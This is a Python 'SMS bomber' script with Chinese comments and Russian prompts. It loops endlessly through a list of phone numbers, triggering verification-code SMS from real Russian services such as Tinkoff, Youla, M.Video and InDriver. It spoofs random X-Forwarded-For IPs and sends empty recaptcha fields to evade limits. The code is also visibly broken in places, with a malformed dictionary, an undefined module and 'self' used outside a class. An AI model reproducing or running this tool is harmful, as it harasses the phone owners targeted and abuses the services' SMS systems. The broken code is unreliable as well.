#!/usr/bin/python
# -*- coding: utf-8 -*-
# 不可用于非法用途，使用本程序所产生的后果，与本人概不相关。

import requests
import re
import threading
import os
import random
import socket
import struct
import time

#API接口初始化，按照手机号生成不同的网址
def initAPI(phone):
    # 短信接口API 请求间隔时间 备注 请求方式 请求参数 需要SESSION的先决请求URL以及Referer
    APIList = [
        ["https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/", 60, "alpari", "GET",
         "client_type": "personal", "email": random.choice(string.ascii_letters) for _ in range(9) + "@gmail.ru", "mobile_phone": phone, "deliveryOption": "sms"}, ""],

        ["https://guru.taxi/api/v1/driver/session/verify", 60, "Guru Taxi", "GET", {"phone": {"code": 1, "number": phone[1:]}},
         ""],

        ["https://krasnodar.delivery-club.ru/ajax/user_otp", 60, "Delivery Club", "POST", {"phone": phone}, ""],

        ["https://api.tinkoff.ru/v1/sign_up", 60, "Тинькофф", "POST",
         {'phone': '+' + phone},
         ""],

        ["https://youla.ru/web-api/auth/request_code", 60, "Юла", "POST", {'phone': phone},
         ""],

        [
            'https://kapibaras.ru/api/lk/sendCode',
            60, "Kapibaras", "GET", {'phone': f'+{self.formatted_phone[0]}({self.formatted_phone[1:4]})-{self.formatted_phone[4:7]}-{self.formatted_phone[7:11]}', 'city': 1}, ""],

        ["https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode", 60, "М. Видео", "POST",
         {"phone": phone, "recaptcha": 'off', "g-recaptcha-response": ""},
         ""],

        ["https://terra-1.indriverapp.com/api/authorization?locale=ru", 60, "InDriver", "POST", {"mode": "request", "phone": "+" + phone,
                                     "phone_permission": "unknown", "stream_id": 0, "v": 3, "appversion": "3.20.6",
                                     "osversion": "unknown", "devicemodel": "unknown"},
         ""]
    ]
    return APIList

# 短信初始化
class initSMS(object):
    """docstring for initSMS"""

    def __init__(self):
        super(initSMS, self).__init__()
        self.SMSList = []
        self.intervalInfo = 0

    def initBomb(self,APIList):
        for x in APIList:
            self.intervalInfo += 1
            self.SMSList.append(SMSObject(x[0], x[1], x[2], x[3], x[4], x[5], self.intervalInfo))
        return self.SMSList


class SMSObject(object):
    """docstring for SMSObject"""  # __var 私有成员变量

    def __init__(self, url, interval, info, method, params, others, intervalInfo):
        super(SMSObject, self).__init__()
        self.__url = url
        self.__interval = interval
        self.__info = info
        self.__intervalInfo = intervalInfo
        self.__method = method
        self.__params = params
        self.__others = others

    def getUrl(self):
        return self.__url

    def getInfo(self):
        return self.__info

    def getParams(self):
        return self.__params

    def getMethod(self):
        return self.__method

    def getOthers(self):
        return self.__others

    def getInterval(self):
        return self.__interval

    def getintervalInfo(self):
        return self.__intervalInfo

    def setintervalInfo(self, intervalInfo):
        self.__intervalInfo = intervalInfo


class Bomb(object):
    """docstring for Bomb"""

    def __init__(self):
        super(Bomb, self).__init__()
        self.HEADERS = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.81 Safari/537.36',
            'Referer': 'http://google,ru',
            'accept-encoding': 'gzip, deflate, br',
            'accept-language': 'ru-RU;q=0.8,en;q=0.4,ja;q=0.2',
            'cache-control': 'max-age=0',
            "X-Requested-With": "XMLHttpRequest"
        }

    def send(self, SMS):
        # return "SUCCESS"
        IP = socket.inet_ntoa(struct.pack('>I', random.randint(1, 0xffffffff)))
        self.HEADERS['X-FORWARDED-FOR'] = IP
        self.HEADERS['CLIENT-IP'] = IP
        try:
            session = requests.Session()
            if SMS.getOthers() != "":
                session.get(SMS.getOthers(), timeout=5, headers=self.HEADERS)
                self.HEADERS['Referer'] = SMS.getOthers()
            if SMS.getMethod() == "GET":
                req = session.post(SMS.getUrl(), json=SMS.getParams(), timeout=5, headers=self.HEADERS)
            else:
                req = session.post(SMS.getUrl(), data=SMS.getParams(), timeout=5, headers=self.HEADERS)
        # print(req.url)
        except Exception as e:
            return str(e)
        return "已发送"



if __name__ == '__main__':
    # 手机号列表，如 ["12345678987","98765432123"]
    nomerok=input("Введите номера через пробел")
    phoneList = nomerok.split(' ')
    bombNum=1
    while True: # 死循环
        currTime=0
        print("\nПошло поехало!!!11 Цклов:",bombNum,"Кароч все ок","\n")
        bombNum+=1
        for phone in phoneList: #遍历每个手机号
            APIList=initAPI(phone) # API接口初始化
            print("\nНомерок：", phone)
            SMSList = initSMS().initBomb(APIList=APIList)
            switchOn = Bomb()
            i = 0
            currTime = 0
            while True:
                currTime += 1
                # print(currTime)
                for x in SMSList:
                    if x.getintervalInfo() == 0:
                        i += 1
                        info = switchOn.send(x)
                        print(str(i) + "." + x.getInfo() + " " + info)
                        x.setintervalInfo(x.getInterval())
                    else:
                        x.setintervalInfo(x.getintervalInfo() - 1)
                time.sleep(5) #设置两次轰炸的间隔时间，单位是秒
                if i==len(APIList):
                    break
